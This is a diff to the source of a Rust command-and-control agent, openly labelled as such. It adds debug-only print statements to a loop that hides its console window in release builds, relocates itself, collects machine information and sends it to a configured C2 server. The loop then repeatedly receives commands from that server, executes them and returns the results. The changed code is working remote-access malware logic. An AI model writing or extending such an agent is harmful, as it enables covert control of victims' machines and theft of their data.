@@ -10,8 +10,10 @@ use sockets::ServerStream;
 use std::error::Error;
 
 pub fn setup() {
-    // hide process' console window
+    // hide process' console window if in release
+    #[cfg(not(debug_assertions))]
     utils::process::hide_console_window();
+
     // make sure the agent is running in the correct path
     if !utils::filesystem::check_desired_dir() {
         utils::filesystem::move_to_desired_dir();
@@ -25,22 +27,37 @@ pub fn run() -> Result<(), Box<dyn Error>> {
     let agent_info = Info::collect();
     let agent_info = agent_info.as_string();
 
+    #[cfg(debug_assertions)]
+    println!("Gathered Machine's Info:\n{}", agent_info);
+
     // create a session with C2 server and send initial data
     let mut server_stream = ServerStream::new(config::server::IP, config::server::PORT)?;
     server_stream.send(agent_info)?;
 
+    #[cfg(debug_assertions)]
+    println!("Connected to C2 Server!");
+
     // starting the main C&C loop
     loop {
+        #[cfg(debug_assertions)]
+        println!("Waiting for a command from the server...");
+        
         // get a command from the server
-        let (input_command, command_size) = server_stream.receive()?;
+        let (server_command, command_size) = server_stream.receive()?;
 
         // parsing command to a string
-        let input_command = input_command.get(..command_size).unwrap();
-        let input_command = String::from_utf8(input_command.to_vec())?;
+        let server_command = server_command.get(..command_size).unwrap();
+        let server_command = String::from_utf8(server_command.to_vec())?;
+
+        #[cfg(debug_assertions)]
+        println!("Server Command: {}", server_command);
 
         // build the command object and execute it
-        let command = Command::from_server(input_command);
+        let command = Command::from_server(server_command);
         let result = command.execute()?;
+
+        #[cfg(debug_assertions)]
+        println!("Command Executed");
 
         // send result back to the server
         server_stream.send(result)?;
